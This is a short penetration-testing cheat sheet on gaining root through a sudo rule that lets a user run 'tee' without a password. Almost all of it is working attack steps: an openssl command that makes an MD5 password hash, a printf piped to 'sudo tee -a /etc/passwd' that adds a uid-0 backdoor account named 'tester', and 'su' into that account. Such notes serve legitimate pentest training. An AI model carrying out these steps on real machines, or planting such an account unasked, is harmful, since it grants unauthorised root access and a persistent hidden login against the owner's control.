# Sudo Tee Privilege Escalation

The `sudo tee` command might be vulnerable to privilege escalation.

### Investigation <a href="#investigation" id="investigation"></a>

```
(root) NOPASSWD: /usr/bin/tee
```

If we can execute **`tee`** command as root, we can escalate to privilege.

### Exploitation <a href="#exploitation" id="exploitation"></a>

#### 1. Create a New Password for New User <a href="#id-1-create-a-new-password-for-new-user" id="id-1-create-a-new-password-for-new-user"></a>

Assume the new username is "tester".

```
# -1: MD5 algorithm
# -salt: Use privided salt -> The new username here
openssl passwd -1 -salt "tester" "password123"

# Output: $1$tester$LvsygQ2GEt7VUJQEqhMLf/
```

Copy the output password.

#### 2. Write New Line with Tee <a href="#id-2-write-new-line-with-tee" id="id-2-write-new-line-with-tee"></a>

Paste the password in **`printf`** and overwrite **`/etc/passwd`** using **`tee`** command.

```
printf 'tester:$1$tester$LvsygQ2GEt7VUJQEqhMLf/:0:0:root:/root:/bin/bash\n' | sudo tee -a /etc/passwd
```

#### 3. Switch to New User <a href="#id-3-switch-to-new-user" id="id-3-switch-to-new-user"></a>

Now the new user was created.\
We can switch to the new user.

```
su tester
password: password123
```
